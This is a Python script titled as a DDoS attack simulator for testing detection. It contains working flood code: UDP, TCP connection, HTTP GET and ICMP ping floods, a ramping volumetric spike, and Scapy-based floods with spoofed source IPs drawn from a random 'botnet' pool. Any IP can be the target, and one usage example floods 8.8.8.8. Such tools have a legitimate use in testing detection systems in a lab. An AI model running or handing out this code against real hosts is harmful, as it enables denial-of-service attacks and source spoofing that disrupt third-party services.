#!/usr/bin/env python3
"""
Attack Simulation Script for DDoS Detection Testing
Generates various types of simulated traffic to test detection capabilities
"""

import socket
import struct
import random
import time
import argparse
import threading
import sys
import os
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import IP, UDP, TCP, send, sendp, Raw, conf, Ether, get_if_hwaddr, get_if_list
    conf.verb = 0  # Silence Scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

def get_local_ip():
    """Get the local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_interface_for_ip(ip):
    """Find which interface has this IP"""
    import subprocess
    try:
        output = subprocess.check_output(['ip', 'route', 'get', ip]).decode()
        for word in output.split():
            if word == 'dev':
                return output.split()[output.split().index(word) + 1]
    except:
        pass
    return "eth0" # fallback

def udp_flood(target_ip, target_port, duration, pps):
    """
    Simulate UDP flood attack
    """
    print(f"[UDP FLOOD] Starting attack -> {target_ip}:{target_port} at {pps} pps for {duration}s")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'X' * 1024  # 1KB payload
    
    start_time = time.time()
    packets_sent = 0
    interval = 1.0 / pps if pps > 0 else 0.001
    
    while time.time() - start_time < duration:
        try:
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            
            # Rate limiting
            if pps < 10000:
                time.sleep(interval)
            
        except Exception as e:
            pass
    
    sock.close()
    elapsed = time.time() - start_time
    actual_pps = packets_sent / elapsed if elapsed > 0 else 0
    print(f"[UDP FLOOD] Complete: {packets_sent} packets, {actual_pps:.0f} actual pps")
    return packets_sent

def tcp_syn_simulation(target_ip, target_port, duration, connections_per_sec):
    """
    Simulate SYN flood by opening many connections
    (Note: Real SYN flood requires raw sockets and root)
    """
    print(f"[TCP SYN SIM] Starting -> {target_ip}:{target_port} at {connections_per_sec} conn/s for {duration}s")
    
    start_time = time.time()
    connections = 0
    failed = 0
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target_ip, target_port))
            sock.close()
            connections += 1
        except:
            failed += 1
        
        if connections_per_sec < 1000:
            time.sleep(1.0 / connections_per_sec)
    
    print(f"[TCP SYN SIM] Complete: {connections} connections, {failed} failed")
    return connections

def icmp_flood(target_ip, duration, pps):
    """
    Simulate ICMP flood using ping subprocess
    """
    import subprocess
    
    print(f"[ICMP FLOOD] Starting ping flood -> {target_ip} for {duration}s")
    
    try:
        # Use ping with flood option (requires root)
        proc = subprocess.Popen(
            ['ping', '-f', '-w', str(duration), target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = proc.communicate(timeout=duration + 5)
        print(f"[ICMP FLOOD] Complete")
        print(stdout.decode() if stdout else "")
    except subprocess.TimeoutExpired:
        proc.kill()
        print("[ICMP FLOOD] Timeout, terminated")
    except Exception as e:
        print(f"[ICMP FLOOD] Error: {e}")
        print("Note: ICMP flood requires root privileges. Try: sudo python3 attack_simulator.py --type icmp")

def http_flood(target_ip, target_port, duration, rps):
    """
    Simulate HTTP GET flood
    """
    print(f"[HTTP FLOOD] Starting -> {target_ip}:{target_port} at {rps} req/s for {duration}s")
    
    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
    
    start_time = time.time()
    requests_sent = 0
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.send(request.encode())
            sock.close()
            requests_sent += 1
        except:
            pass
        
        if rps < 1000:
            time.sleep(1.0 / rps)
    
    print(f"[HTTP FLOOD] Complete: {requests_sent} requests")
    return requests_sent

def mixed_attack(target_ip, duration, pps):
    """
    Simulate mixed attack (UDP + TCP + ICMP)
    """
    print(f"[MIXED ATTACK] Starting multi-vector attack -> {target_ip} at {pps} total pps for {duration}s")
    
    # Distribute pps
    udp_pps = int(pps * 0.4)
    tcp_pps = int(pps * 0.1)
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [
            executor.submit(udp_flood, target_ip, 53, duration, udp_pps),
            executor.submit(udp_flood, target_ip, 123, duration, udp_pps),
            executor.submit(tcp_syn_simulation, target_ip, 80, duration, tcp_pps),
            executor.submit(tcp_syn_simulation, target_ip, 443, duration, tcp_pps),
        ]
        
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"Error: {e}")
    
    print("[MIXED ATTACK] Complete")

def volumetric_spike(target_ip, duration, max_pps):
    """
    Simulate sudden traffic spike (volumetric attack pattern)
    """
    print(f"[VOLUMETRIC SPIKE] Ramping up traffic to {target_ip}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'X' * 512
    
    start_time = time.time()
    ramp_duration = duration / 3
    
    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        
        # Ramp up, sustain, ramp down
        if elapsed < ramp_duration:
            current_pps = int(max_pps * (elapsed / ramp_duration))
        elif elapsed < ramp_duration * 2:
            current_pps = max_pps
        else:
            remaining = duration - elapsed
            current_pps = int(max_pps * (remaining / ramp_duration))
        
        current_pps = max(10, current_pps)
        interval = 1.0 / current_pps
        
        try:
            sock.sendto(payload, (target_ip, 12345))
        except:
            pass
        
        time.sleep(interval)
    
    sock.close()
    print("[VOLUMETRIC SPIKE] Complete")

# Generate a pool of "bot" IPs to reuse, so they get blocked
BOTNET_SIZE = 100
BOTNET = [".".join(str(random.randint(1, 254)) for _ in range(4)) for _ in range(BOTNET_SIZE)]

def get_source_ip(user_provided=None):
    """Return provided IP or a random one from the botnet pool"""
    if user_provided:
        return user_provided
    # Return a random IP from our fixed botnet list
    return random.choice(BOTNET)

def spoofed_udp_flood(target_ip, target_port, duration, pps, source_ip=None, iface=None):
    """
    Simulate Spoofed UDP flood (L2 for speed)
    """
    if not iface:
        iface = get_interface_for_ip(target_ip)
        
    # Use broadcast MAC to ensure peer receives it on veth pair
    dst_mac = "ff:ff:ff:ff:ff:ff"
        
    mode_text = f"from {source_ip}" if source_ip else "distributed (random IPs)"
    print(f"[SPOOFED UDP] Starting {mode_text} -> {target_ip}:{target_port} via {iface} (dst: {dst_mac})")
    
    start_time = time.time()
    packets_sent = 0
    interval = 1.0 / pps if pps > 0 else 0
    
    # Pre-craft template
    eth = Ether(dst=dst_mac)
    udp = UDP(dport=target_port)
    payload = Raw(b'X' * 64)
    
    while time.time() - start_time < duration:
        try:
            src = get_source_ip(source_ip)
            pkt = eth / IP(src=src, dst=target_ip) / udp / payload
            sendp(pkt, iface=iface, verbose=False)
            packets_sent += 1
            
            if interval > 0:
                time.sleep(interval)
        except Exception as e:
            pass
            
    print(f"[SPOOFED UDP] Complete: {packets_sent} packets sent")

def spoofed_tcp_syn_flood(target_ip, target_port, duration, pps, source_ip=None, iface=None):
    """
    Simulate Spoofed TCP SYN flood (L2 for speed)
    """
    if not iface:
        iface = get_interface_for_ip(target_ip)
        
    # Use broadcast MAC to ensure peer receives it on veth pair
    dst_mac = "ff:ff:ff:ff:ff:ff"

    mode_text = f"from {source_ip}" if source_ip else "distributed (random IPs)"
    print(f"[SPOOFED SYN] Starting {mode_text} -> {target_ip}:{target_port} via {iface} (dst: {dst_mac})")
    
    start_time = time.time()
    packets_sent = 0
    interval = 1.0 / pps if pps > 0 else 0
    
    eth = Ether(dst=dst_mac)
    
    while time.time() - start_time < duration:
        try:
            src = get_source_ip(source_ip)
            sport = random.randint(1024, 65535)
            pkt = eth / IP(src=src, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
            sendp(pkt, iface=iface, verbose=False)
            packets_sent += 1
            
            if interval > 0:
                time.sleep(interval)
        except Exception as e:
            pass
            
    print(f"[SPOOFED SYN] Complete: {packets_sent} packets sent")

def spoofed_mixed_attack(target_ip, duration, pps, source_ip=None, iface=None):
    """
    Simulate Spoofed Mixed Attack
    """
    print(f"[SPOOFED MIXED] Starting multi-vector spoofed attack -> {target_ip} at {pps} total pps")
    
    # Distribute pps
    udp_pps = int(pps * 0.4)
    tcp_pps = int(pps * 0.1)
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [
            executor.submit(spoofed_udp_flood, target_ip, 53, duration, udp_pps, source_ip, iface),
            executor.submit(spoofed_udp_flood, target_ip, 123, duration, udp_pps, source_ip, iface),
            executor.submit(spoofed_tcp_syn_flood, target_ip, 80, duration, tcp_pps, source_ip, iface),
            executor.submit(spoofed_tcp_syn_flood, target_ip, 443, duration, tcp_pps, source_ip, iface),
        ]
        
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"Error: {e}")
                
    print("[SPOOFED MIXED] Complete")

def main():
    parser = argparse.ArgumentParser(
        description='DDoS Attack Simulator for Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # UDP flood to local machine
  python3 attack_simulator.py --type udp --target 127.0.0.1 --duration 30 --pps 1000
  
  # TCP SYN simulation
  python3 attack_simulator.py --type tcp --target 192.168.1.100 --port 80
  
  # ICMP flood (requires root)
  sudo python3 attack_simulator.py --type icmp --target 8.8.8.8
  
  # Mixed attack
  python3 attack_simulator.py --type mixed --target 127.0.0.1
  
  # Traffic spike simulation
  python3 attack_simulator.py --type spike --target 127.0.0.1 --pps 5000
        """
    )
    
    parser.add_argument(
        '--type', '-t',
        choices=['udp', 'tcp', 'icmp', 'http', 'mixed', 'spike'],
        default='udp',
        help='Attack type (default: udp)'
    )
    
    parser.add_argument(
        '--target', '-T',
        default=get_local_ip(),
        help=f'Target IP (default: your IP {get_local_ip()})'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=12345,
        help='Target port (default: 12345)'
    )
    
    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=30,
        help='Attack duration in seconds (default: 30)'
    )
    
    parser.add_argument(
        '--pps',
        type=int,
        default=1000,
        help='Packets per second (default: 1000)'
    )
    
    parser.add_argument(
        '--distributed', '-D',
        action='store_true',
        help='Enable distributed mode (spoof source IPs) - Requires ROOT and Scapy'
    )
    
    parser.add_argument(
        '--source', '-S',
        default=None,
        help='Specific source IP to spoof (if combined with -D). If empty, random IPs are used.'
    )
    
    parser.add_argument(
        '--interface', '-i',
        default=None,
        help='Network interface to use (e.g., eth0, eth7). Recommended for distributed mode.'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("DDoS Attack Simulator - FOR TESTING ONLY")
    print("=" * 60)
    print(f"Attack Type: {args.type.upper()}")
    print(f"Target: {args.target}:{args.port}")
    if args.distributed:
        src_text = args.source if args.source else "RANDOM (Distributed)"
        print(f"Source: {src_text}")
    if args.interface:
        print(f"Interface: {args.interface}")
    print(f"Duration: {args.duration}s")
    print(f"Rate: {args.pps} pps")
    print("=" * 60)
    print()
    
    if args.distributed:
        if not SCAPY_AVAILABLE:
            print("Error: Scapy is required for distributed mode but not installed.")
            print("Try: pip install scapy")
            return
        if os.geteuid() != 0:
            print("Error: Distributed mode requires root privileges (pseudo-random source IPs).")
            print("Try: sudo python3 attack_simulator.py ...")
            return
            
        iface = args.interface if args.interface else get_interface_for_ip(args.target)
        src_type = f"fixed IP {args.source}" if args.source else "random IPs"
        print(f"[DISTRIBUTED MODE] Using {src_type} spoofing on {iface}")

    # Confirmation
    response = input("Start attack simulation? [y/N]: ")
    if response.lower() != 'y':
        print("Cancelled.")
        return
    
    print()
    
    # Override logic for distributed
    iface = args.interface if args.interface else None

    if args.type == 'udp':
        if args.distributed:
            # We need to pass iface to our spoofed functions
            # I'll update the function signatures in the next step or assume they can handle it
            spoofed_udp_flood(args.target, args.port, args.duration, args.pps, args.source, iface)
        else:
            udp_flood(args.target, args.port, args.duration, args.pps)
    elif args.type == 'tcp':
        if args.distributed:
            spoofed_tcp_syn_flood(args.target, args.port, args.duration, args.pps, args.source, iface)
        else:
            tcp_syn_simulation(args.target, args.port, args.duration, args.pps)
    elif args.type == 'icmp':
        icmp_flood(args.target, args.duration, args.pps)
    elif args.type == 'http':
        if args.distributed:
            print("Note: HTTP flood in distributed mode is not supported (requires 3-way handshake).")
            print("Falling back to standard mode.")
        http_flood(args.target, args.port, args.duration, args.pps)
    elif args.type == 'mixed':
        if args.distributed:
            spoofed_mixed_attack(args.target, args.duration, args.pps, args.source, iface)
        else:
            mixed_attack(args.target, args.duration, args.pps)
    elif args.type == 'spike':
        volumetric_spike(args.target, args.duration, args.pps)
    
    print()
    print("Attack simulation complete. Check the dashboard for detection results.")

if __name__ == '__main__':
    main()
